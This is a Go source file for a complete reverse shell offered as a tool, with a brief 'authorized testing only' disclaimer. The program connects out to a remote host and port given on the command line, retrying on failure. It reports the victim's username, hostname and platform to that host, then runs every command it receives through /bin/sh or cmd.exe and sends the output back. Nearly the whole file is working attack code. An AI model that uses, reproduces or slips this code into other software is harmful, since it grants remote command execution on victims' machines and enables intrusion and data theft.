// Reverse Shell in Go
// Build: go build -o reverse_shell reverse_shell.go
// Usage: ./reverse_shell <target_ip> <target_port>
// DISCLAIMER: For authorized testing only!

package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type ReverseShell struct {
	target string
	port   string
	conn   net.Conn
}

func NewReverseShell(target, port string) *ReverseShell {
	return &ReverseShell{
		target: target,
		port:   port,
	}
}

func (rs *ReverseShell) Connect() error {
	address := fmt.Sprintf("%s:%s", rs.target, rs.port)
	fmt.Printf("[+] Attempting to connect to %s\n", address)

	var err error
	for i := 0; i < 5; i++ {
		rs.conn, err = net.Dial("tcp", address)
		if err == nil {
			fmt.Printf("[+] Connected to %s\n", address)
			return nil
		}
		fmt.Printf("[-] Connection attempt %d failed: %v\n", i+1, err)
		time.Sleep(time.Second * 2)
	}
	return fmt.Errorf("failed to connect after 5 attempts")
}

func (rs *ReverseShell) SendBanner() {
	banner := fmt.Sprintf("[+] Reverse shell connected from %s\n", getHostInfo())
	rs.conn.Write([]byte(banner))
}

func (rs *ReverseShell) HandleCommands() {
	defer rs.conn.Close()

	rs.SendBanner()

	scanner := bufio.NewScanner(rs.conn)
	for scanner.Scan() {
		command := strings.TrimSpace(scanner.Text())
		if command == "" {
			continue
		}

		if command == "exit" || command == "quit" {
			rs.conn.Write([]byte("[+] Goodbye!\n"))
			break
		}

		output := rs.executeCommand(command)
		rs.conn.Write([]byte(output))
		rs.conn.Write([]byte("\n$ "))
	}
}

func (rs *ReverseShell) executeCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, string(output))
	}

	return string(output)
}

func getHostInfo() string {
	hostname, _ := os.Hostname()
	username := getUsername()
	os := runtime.GOOS
	arch := runtime.GOARCH

	return fmt.Sprintf("%s@%s (%s/%s)", username, hostname, os, arch)
}

func getUsername() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERNAME")
	}
	return os.Getenv("USER")
}

func printReverseUsage() {
	fmt.Println("Reverse Shell in Go")
	fmt.Println("Usage: reverse_shell <target_ip> <target_port>")
	fmt.Println("")
	fmt.Println("Examples:")
	fmt.Println("  ./reverse_shell 192.168.1.100 4444")
	fmt.Println("  ./reverse_shell 10.0.0.1 8080")
	fmt.Println("")
	fmt.Println("Note: This tool is for authorized testing only!")
}

func main() {
	if len(os.Args) != 3 {
		printReverseUsage()
		os.Exit(1)
	}

	target := os.Args[1]
	port := os.Args[2]

	// Validate inputs
	if target == "" || port == "" {
		fmt.Println("Error: Target IP and port are required")
		printReverseUsage()
		os.Exit(1)
	}

	// Create and start reverse shell
	rs := NewReverseShell(target, port)

	err := rs.Connect()
	if err != nil {
		fmt.Printf("[-] Connection failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Starting command handler...")
	rs.HandleCommands()
}
